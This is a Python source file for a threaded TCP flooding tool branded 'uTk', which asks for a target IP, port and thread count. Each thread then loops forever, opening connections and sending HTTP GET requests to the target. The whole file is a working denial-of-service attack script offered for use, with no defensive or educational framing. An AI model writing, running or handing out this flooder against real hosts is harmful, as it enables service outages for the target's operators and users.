import socket
import threading
import time

# 🎨 Colors
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
MAGENTA = "\033[1;35m"
RESET = "\033[0m"

# 🖤 uTk Banner
print(RED + """
██╗░░░██╗████████╗██╗░░██╗
██║░░░██║╚══██╔══╝██║░██╔╝
██║░░░██║░░░██║░░░█████═╝░
██║░░░██║░░░██║░░░██╔═██╗░
╚██████╔╝░░░██║░░░██║░╚██╗
░╚═════╝░░░░╚═╝░░░╚═╝░░╚═╝
""" + RESET)

print(MAGENTA + "     >>> uTk // TCP Flooder // Press Ctrl+C to STOP <<<\n" + RESET)

# 🌐 Input section
target = input(CYAN + "🌐 Target IP: " + RESET)
port = int(input(CYAN + "🔌 Port (default 80): " + RESET))
threads = int(input(CYAN + "💥 Threads to launch: " + RESET))

# 💣 Attack function
def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.send(b"GET / HTTP/1.1\r\nHost: utk\r\n\r\n")
            s.close()
            print(GREEN + f"[+] Packet sent to {target}:{port}" + RESET)
        except Exception:
            print(RED + f"[-] Failed to connect to {target}:{port}" + RESET)

# 🚀 Launching threads
print(YELLOW + f"\n[!] Launching {threads} threads to flood {target}:{port}..." + RESET)
time.sleep(1)

# 🔁 Thread loop with Ctrl+C handler
try:
    for i in range(threads):
        t = threading.Thread(target=attack)
        t.daemon = True
        t.start()
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print(RED + "\n\n[✘] Attack stopped by user (Ctrl+C pressed).")
    print(GREEN + "[✓] uTk going back into shadows...\n" + RESET)
